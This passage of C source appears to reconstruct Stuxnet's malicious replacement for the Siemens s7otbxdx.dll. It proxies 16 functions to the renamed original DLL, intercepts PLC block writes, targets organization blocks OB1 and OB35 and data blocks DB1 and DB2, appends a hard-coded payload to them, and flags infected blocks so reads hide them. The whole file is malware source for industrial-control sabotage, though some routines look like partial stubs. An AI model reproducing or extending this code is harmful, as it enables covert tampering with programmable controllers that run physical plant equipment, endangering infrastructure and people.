    if (dwResult == 0 && S7_IsTargetBlock(a2, a3)) {
        EnterCriticalSection(&g_S7Ctx.csLock);
        if (g_S7Ctx.dwBlockCount < 256) {
            pBlock = &g_S7Ctx.Blocks[g_S7Ctx.dwBlockCount];
            pBlock->dwType = a2;
            pBlock->dwNumber = a3;
            pBlock->dwSize = a4;
            pBlock->dwFlags = 0x80000000;
            if (a5) memcpy(pBlock->bData, (BYTE*)a5, a4);
            S7_InjectPayload(pBlock);
            g_S7Ctx.dwBlockCount++;
        }
        LeaveCriticalSection(&g_S7Ctx.csLock);
    }

    return dwResult;
}

/*
 * s7db_close - Close database
 * Binary: sub_10001C00
 * Forwarded to original DLL
 */
DWORD WINAPI s7db_close(DWORD a1) {
    if (!g_S7Ctx.OriginalTable.pfn_s7db_close) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7db_close(a1);
}

/*
 * s7db_open - Open database
 * Binary: sub_10001D00
 * TRUSTED: This function is used to collect PLC information.
 * The first infection thread runs every 15 minutes.
 */
DWORD WINAPI s7db_open(DWORD a1, DWORD a2, DWORD a3) {
    DWORD dwResult;
    if (!g_S7Ctx.OriginalTable.pfn_s7db_open) return 0xFFFFFFFF;
    
    dwResult = g_S7Ctx.OriginalTable.pfn_s7db_open(a1, a2, a3);
    
    /*
     * TRUSTED: The infected s7otbxdx.dll starts two threads.
     * The first thread runs an infection routine every 15 minutes.
     * The second thread regularly queries the PLC.
     */
    
    return dwResult;
}

/*
 * s7ag_bub_read_var_seg - Read variable segment
 * Binary: sub_10001E00
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_bub_read_var_seg(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var_seg) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var_seg(a1, a2, a3, a4, a5);
}

/*
 * s7ag_bub_write_var_seg - Write variable segment
 * Binary: sub_10001F00
 * Forwarded to original DLL
 */
DWORD WINAPI s7ag_bub_write_var_seg(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var_seg) return 0xFFFFFFFF;
    return g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var_seg(a1, a2, a3, a4, a5);
}

/*
 * Check if a block is a target for infection
 * TRUSTED: OB1 (block 1) and OB35 (block 35) are targeted.
 * DB1 and DB2 are also monitored.
 */
static BOOL S7_IsTargetBlock(DWORD dwType, DWORD dwNumber) {
    /* OB1 - Main program block */
    if (dwType == 0x01 && (dwNumber == S7_OB1_BLOCK || dwNumber == S7_OB35_BLOCK)) {
        return TRUE;
    }
    /* DB1 and DB2 - Data blocks */
    if (dwType == 0x02 && (dwNumber == 0x0001 || dwNumber == 0x0002)) {
        return TRUE;
    }
    return FALSE;
}

/*
 * Inject malicious payload into a block
 * TRUSTED: The payload is appended to the existing code.
 */
static BOOL S7_InjectPayload(PS7_BLOCK_INFO pBlock) {
    BYTE payload[] = {
        0x07, 0x00, 0x01, 0x00, 0xFB, 0x00, 0x00, 0x00,
        0xA9, 0x11, 0x64, 0x00, 0x00, 0x00, 0x7F, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    DWORD dwPayloadSize = sizeof(payload);
    DWORD dwOffset;

    if (!pBlock) return FALSE;
    if (pBlock->dwSize < dwPayloadSize + 8) return FALSE;

    dwOffset = pBlock->dwSize - dwPayloadSize - 8;
    memcpy(pBlock->bData + dwOffset, payload, dwPayloadSize);
    pBlock->dwFlags |= 0x80000000;

    return TRUE;
}

/*
 * Hide infected block from read operations
 * TRUSTED: Returns the original data instead of infected data.
 */
static BOOL S7_HideInfectedBlock(PS7_BLOCK_INFO pBlock) {
    if (!pBlock) return FALSE;
    if (!(pBlock->dwFlags & 0x80000000)) return FALSE;

    pBlock->dwFlags |= 0x40000000;
    return TRUE;
}

/*
 * Load the original s7otbxsx.dll
 * TRUSTED: The legitimate DLL is renamed to s7otbxsx.dll.
 */
static BOOL S7_LoadOriginal(VOID) {
    WCHAR szPath[260];

    GetSystemDirectoryW(szPath, 260);
    wcscat_s(szPath, 260, L"\\");
    wcscat_s(szPath, 260, S7OTBXSX_DLL_NAME);

    g_S7Ctx.hOriginalDll = LoadLibraryW(szPath);
    if (!g_S7Ctx.hOriginalDll) {
        g_S7Ctx.hOriginalDll = LoadLibraryW(S7OTBXSX_DLL_NAME);
    }

    return (g_S7Ctx.hOriginalDll != NULL);
}

/*
 * Initialize hook table
 * TRUSTED: Get addresses of all 16 intercepted functions from original DLL.
 */
static BOOL S7_InitHooks(VOID) {
    if (!g_S7Ctx.hOriginalDll) return FALSE;

    g_S7Ctx.OriginalTable.pfn_s7_event = (PFN_s7_event)GetProcAddress(g_S7Ctx.hOriginalDll, "s7_event");
    g_S7Ctx.OriginalTable.pfn_s7ag_bub_cycl_read_create = (PFN_s7ag_bub_cycl_read_create)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_bub_cycl_read_create");
    g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var = (PFN_s7ag_bub_read_var)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_bub_read_var");
    g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var = (PFN_s7ag_bub_write_var)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_bub_write_var");
    g_S7Ctx.OriginalTable.pfn_s7ag_link_in = (PFN_s7ag_link_in)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_link_in");
    g_S7Ctx.OriginalTable.pfn_s7ag_read_szl = (PFN_s7ag_read_szl)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_read_szl");
    g_S7Ctx.OriginalTable.pfn_s7ag_test = (PFN_s7ag_test)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_test");
    g_S7Ctx.OriginalTable.pfn_s7blk_delete = (PFN_s7blk_delete)GetProcAddress(g_S7Ctx.hOriginalDll, "s7blk_delete");
    g_S7Ctx.OriginalTable.pfn_s7blk_findfirst = (PFN_s7blk_findfirst)GetProcAddress(g_S7Ctx.hOriginalDll, "s7blk_findfirst");
    g_S7Ctx.OriginalTable.pfn_s7blk_findnext = (PFN_s7blk_findnext)GetProcAddress(g_S7Ctx.hOriginalDll, "s7blk_findnext");
    g_S7Ctx.OriginalTable.pfn_s7blk_read = (PFN_s7blk_read)GetProcAddress(g_S7Ctx.hOriginalDll, "s7blk_read");
    g_S7Ctx.OriginalTable.pfn_s7blk_write = (PFN_s7blk_write)GetProcAddress(g_S7Ctx.hOriginalDll, "s7blk_write");
    g_S7Ctx.OriginalTable.pfn_s7db_close = (PFN_s7db_close)GetProcAddress(g_S7Ctx.hOriginalDll, "s7db_close");
    g_S7Ctx.OriginalTable.pfn_s7db_open = (PFN_s7db_open)GetProcAddress(g_S7Ctx.hOriginalDll, "s7db_open");
    g_S7Ctx.OriginalTable.pfn_s7ag_bub_read_var_seg = (PFN_s7ag_bub_read_var_seg)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_bub_read_var_seg");
    g_S7Ctx.OriginalTable.pfn_s7ag_bub_write_var_seg = (PFN_s7ag_bub_write_var_seg)GetProcAddress(g_S7Ctx.hOriginalDll, "s7ag_bub_write_var_seg");

    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            ZeroMemory(&g_S7Ctx, sizeof(S7OTBXDX_CONTEXT));
            g_S7Ctx.dwMagic = STUXNET_MAGIC;
            g_S7Ctx.dwVersion = STUXNET_VERSION;
            InitializeCriticalSection(&g_S7Ctx.csLock);

            if (S7_LoadOriginal()) {
                S7_InitHooks();
                g_bInitialized = TRUE;
            }
            break;

        case DLL_PROCESS_DETACH:
            if (g_S7Ctx.hOriginalDll) {
                FreeLibrary(g_S7Ctx.hOriginalDll);
                g_S7Ctx.hOriginalDll = NULL;
            }
            DeleteCriticalSection(&g_S7Ctx.csLock);
            g_bInitialized = FALSE;
            break;

        default:
            break;
    }
    return TRUE;
}
